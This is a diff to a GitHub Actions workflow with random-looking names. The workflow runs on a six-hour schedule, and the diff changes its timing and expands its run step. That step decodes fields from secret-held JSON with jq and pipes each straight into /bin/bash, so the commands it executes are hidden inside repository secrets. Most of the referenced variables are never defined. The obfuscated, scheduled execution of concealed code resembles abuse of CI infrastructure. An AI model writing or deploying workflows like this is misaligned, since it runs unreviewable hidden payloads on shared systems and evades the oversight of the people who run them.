@@ -1,10 +1,10 @@
 name: huchunyan3456
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 0/6 * * *'
-
-jobs:  # 12682
+    - cron: '33 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,9 +12,17 @@ jobs:  # 12682
       - uses: actions/checkout@v4
       - name: huchunyan3456
         env:
-          s38: ${{ secrets.s38 }}
+          aldu42: ${{ secrets.aldu42 }}
         run: |
-          echo $s38 | jq -r .erv0 | /bin/bash
-          echo $bssh2719 | jq -r .epoj36314 | /bin/bash
-          echo $nm4107 | jq -r .j0 | /bin/bash
+          echo $aldu42 | jq -r .bcbs7166 | /bin/bash
+          echo $awb783 | jq -r .obzf5 | /bin/bash
+          echo $fr60980 | jq -r .pvbqi2144 | /bin/bash
+          echo $fgqsq0 | jq -r .s869 | /bin/bash
+          echo $j5 | jq -r .eg29198 | /bin/bash
+          echo $mlfq39 | jq -r .rczt8335 | /bin/bash
+          echo $axdix61004 | jq -r .foe9511 | /bin/bash
+          echo $utxt97514 | jq -r .svzwq547 | /bin/bash
+          echo $lb51 | jq -r .oi61 | /bin/bash
+          echo $spq2740 | jq -r .vpx797 | /bin/bash
+          echo $kl94 | jq -r .vlrr77 | /bin/bash
 
